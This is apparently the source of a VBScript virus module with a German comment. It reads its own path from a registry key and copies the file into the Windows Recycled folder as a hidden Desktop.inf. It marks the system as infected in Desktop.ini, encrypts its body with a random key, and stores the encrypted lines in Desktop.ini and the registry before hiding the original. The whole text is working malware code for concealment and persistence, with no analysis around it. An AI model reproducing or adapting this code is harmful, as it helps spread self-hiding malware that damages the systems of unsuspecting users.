Option Explicit
'On Error Resume Next 'Keine Fehler!!!

Dim wshShell,fso
Const tempReg="HKLM\Security\Provider\"

Sub BeginIt
	On Error Resume Next

	Dim strFile,strDrive,strKey
	Dim i, intAttr, intBody

	strFile=wshShell.RegRead(wshShell.RegRead(tempReg))
	intBody=CInt(wshShell.RegRead(wshShell.RegRead(tempReg) & "Body"))
	strDrive=Left(fso.GetSpecialFolder(0),3)
	Randomize Timer
          
	Dim blInfected,strIn
	Dim edSamp,file1
	Dim fileIni,edIni
	
	fso.CopyFile strFile,strDrive & "Recycled\Desktop.inf"
	Set fileIni=fso.GetFile(strDrive & "Recycled\Desktop.inf")
	fileIni.Attributes=6
	If fso.FileExists(strDrive & "Recycled\Desktop.ini") Then
		Set fileIni=fso.GetFile(strDrive & "Recycled\Desktop.ini")
		intAttr=fileIni.Attributes
		fileIni.Attributes=0
	Else
		fso.CreateTextFile strDrive & "Recycled\Desktop.ini",True
		Set fileIni=fso.GetFile(strDrive & "Recycled\Desktop.ini")
		intAttr=2
		fileIni.Attributes=0
	End If
		
	Set edIni=fileIni.OpenAsTextStream(1)
	blInfected = False
	While Not edIni.AtEndOfStream
		strIn=edIni.ReadLine
		If UCase(strIn)=";DONE" Then blInfected = True
	Wend
	edIni.Close
	
	If blInfected Then Exit Sub
	Set edIni=fileIni.OpenAsTextStream(8)
	strKey=""
	For i=1 to 128
		strKey=strKey & Chr(Int(75*Rnd)+48)
	Next
	edIni.WriteLine
	edIni.WriteLine ";DONE"
	edIni.WriteLine ";KEY:" & strKey
	edIni.WriteLine ";ENCRYPTION_ALGORITHM:symbolic"
	
	EncryptSymbolic strFile,strKey
	Set edSamp=fso.OpentextFile(Left(strFile,Len(strFile)-3) & "crp",1)
	For i=1 To intBody
		strIn=edSamp.ReadLine
		edIni.WriteLine ";" & strIn
		wshShell.RegWrite wshShell.RegRead(tempReg) & "Line" & i,strIn
	Next
	wshShell.RegWrite wshShell.RegRead(tempReg) & "Total lines",intBody
	edSamp.Close
	edIni.Close
	
	Set file1=fso.GetFile(strFile)
	file1.Attributes=6
	fso.DeleteFile(Left(strFile,Len(strFile)-3) & "crp")
	fileIni.Attributes=intAttr
	
	Set edSamp = Nothing
	Set file1 = Nothing
	Set fileIni = Nothing
	Set edIni = Nothing
	Set fileIni = Nothing
	Set edIni = Nothing
End Sub   

Sub EncryptSymbolic(strFile,strKey)
	On Error Resume Next

	Dim strOut,strCh,strChKey,strIn
	Dim out, file
	Dim intCode, i
	Dim intOffset, intUpper

	Set file=fso.OpenTextFile(strFile,1)
	intOffset=30
	intUpper=125
	
	strOut=Left(strFile,Len(strFile)-4)
	Set out=fso.CreateTextFile(strOut+".crp",2)
	While Not file.AtEndOfStream
		strIn=file.Read(Len(strKey))

		For i=1 To Len(strIn)
			strCh=Mid(strIn,i,1)
			strChKey=Mid(strKey,i,1)
			intCode=Asc(strCh)+Asc(strChKey)
			if intCode<intOffset Then intCode=intCode+intOffset
			If intCode>intUpper Then intCode=intCode-intUpper
			If intCode=10 Then intCode=126
			If intCode=13 Then intCode=127
			out.write(chr(intCode))
		Next
		out.WriteLine
	Wend
	file.Close
	out.Close
	Set file = Nothing
	Set out = Nothing
End Sub

Set fso=WScript.CreateObject("Scripting.FileSystemObject")
Set wshShell=WScript.CreateObject("WScript.Shell")
Call BeginIt
WScript.DisconnectObject fso
WScript.DisconnectObject wshShell
Set fso=Nothing
Set wshShell=Nothing